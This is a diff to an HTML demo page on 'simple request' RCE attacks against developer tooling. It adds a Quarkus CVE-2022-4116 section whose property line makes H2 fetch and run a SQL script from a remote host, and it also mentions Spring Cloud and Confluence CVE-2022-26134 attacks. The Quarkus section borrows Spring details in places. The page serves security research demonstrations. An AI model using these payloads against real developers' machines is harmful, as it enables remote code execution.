@@ -4,6 +4,24 @@
   <body>
     <center><h1>Simple Request Vulnerabilities in the Developer Environment</h1></center>
     Following the below guide and clicking on the payload link will trigger a RCE on your local machine. In all but one instance this will open the Calculator app. ( assuming you are using a Mac. ) Or for Confluence create a file in /tmp.</br></br>
+</br>
+The repo https://github.com/JoeBeeton/simple-request-attacks contains sample codebases for the below vulnerabilities as well as a docker file to run the payloads locally.
+</br>
+<h3> Quarkus RCE CVE-2022-4116 </h3></br>
+    This vulnerability allows utilises the Dev UI which is available when the application is in Developer Mode. The Dev UI has the ability to modify application properties. Up until 2.14.2 it was possible to generate a simple request that modifies those properties and leverage that to execute arbitrary code in the target's JVM.
+    </br>
+    This is done by first setting the quarkus app's jdbc url to : </br>
+    <i>
+    quarkus.datasource.jdbc.url=jdbc:h2:mem:testdb;INIT=runscript from 'https://github.bla:8081/exec.sql'</i></br>
+    Then restarting the application so the change takes effect via the /restart actuator. </br>
+    On startup, the Spring App will create a in memory H2 database and call out to http://somerandomsite.bla:8081/exec.sql to download the sql and execute it. This leverages a feature of the in memory H2 database to compile and execute a Java method which in turn opens the Calculator app.
+    <p><b>To Run : </b></br><i>
+    git clone https://github.com/JoeBeeton/simple-request-attacks.git</br>
+    cd Simple-Requests/spring-cloud-v1-vuln</br>
+    mvn spring-boot:run</br>
+  </i>
+    <a href="springcloud.html">Payload Link</a></p>
+</br>
     <h3> Spring Cloud </h3>
     This works because Spring Cloud V1 allowed the /env actuator to modify properties with a POST request with content type application/x-www-form-urlencoded. Allowing for a Simple Request attack.</br>
     This is done by first setting the spring app's jdbc url to : </br>
@@ -42,7 +60,6 @@
     <h3>Confluence CVE-2022-26134</h3>
     This Confluence RCE relies on OGNL injection. As it is done via a Simple Get Request, it can be run via a Simple Request accessing localhost or an internal network that the victim has access to.
     <p><b>To Run : </b></br><i>
-      
       git clone https://github.com/vulhub/vulhub.git </br>
       cd vulhub/confluence/CVE-2022-26134  </br>
       docker-compose up
